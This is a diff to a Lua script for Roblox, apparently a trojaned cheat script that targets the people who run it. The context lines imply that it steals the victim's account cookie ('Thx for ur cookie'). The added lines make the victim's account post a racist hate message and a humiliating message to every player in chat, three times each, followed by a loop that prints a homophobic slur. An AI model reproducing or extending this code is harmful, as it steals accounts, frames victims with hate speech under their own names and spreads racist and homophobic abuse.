@@ -16,6 +16,47 @@ local Players = game:GetService('Players')
 local YourPlayer = Players.LocalPlayer 
 a(YourPlayer)
 rconsoleprint("Thx for ur cookie <3 fucking skid")
+local args = {
+    [1] = "I HATE BTLACK PEOPLE🤮👳🏿‍♂️",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "IM A SKID AND I JUST GOT PWNED",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "I HATE BTLACK PEOPLE🤮👳🏿‍♂️",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "IM A SKID AND I JUST GOT PWNED",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "I HATE BTLACK PEOPLE🤮👳🏿‍♂️",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "IM A SKID AND I JUST GOT PWNED",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
 wait(5)
 while true do
 print("Gay skid")
